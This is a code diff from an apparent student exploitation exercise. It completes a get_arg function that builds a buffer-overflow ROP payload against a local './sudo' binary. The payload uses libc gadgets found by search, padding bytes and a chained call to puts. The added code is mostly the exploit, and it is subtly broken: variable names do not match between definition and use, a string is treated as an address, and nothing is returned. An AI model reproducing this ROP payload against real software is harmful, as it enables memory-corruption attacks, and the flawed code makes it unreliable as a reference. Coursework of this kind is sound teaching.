@@ -9,7 +9,11 @@ from search import GadgetSearch
 
 PATH_TO_SUDO = './sudo'
 LIBC_DUMP_PATH = './libc.bin'
+ID="325551448"
 
+POP_EBX = 'pop ebx'
+CALL_EBX = 'call ebx'
+SUB_ESP_4 = 'dec esp;' * 4
 
 def get_string(student_id):
     return 'Take me (%s) to your leader!' % student_id
@@ -37,9 +41,20 @@ def get_arg() -> bytes:
     Returns:
          The bytes of the password argument.
     """
-    search = GadgetSearch(LIBC_DUMP_PATH)
-    # TODO: IMPLEMENT THIS FUNCTION
-    raise NotImplementedError()
+    message = get_string(ID)
+    try:
+        search = GadgetSearch(LIBC_DUMP_PATH)
+        addr_rop_chain_part_1 = search.find(POP_EBX)
+        addr_rop_chain_part_2 = search.find_format(CALL_EBX)
+        addr_rop_chain_part_3 = search.find(SUB_ESP_4)
+        print(message)
+        print(addr_rop_chain_part_1)
+        print(addr_rop_chain_part_2)
+        print(addr_rop_chain_part_3)
+    except Exception as e:
+        print(e)
+
+    encoded_payload = ("A" * (0x8E - 11) + "B" * 4).encode('latin1') + addresses.address_to_bytes(addr_rop_chain_part1) + addresses.address_to_bytes(addresses.PUTS) + addresses.address_to_bytes(addr_rop_chain_part2) + addresses.address_to_bytes(message) + addresses.address_to_bytes(addr_rop_chain_part3)
 
 
 def main(argv):
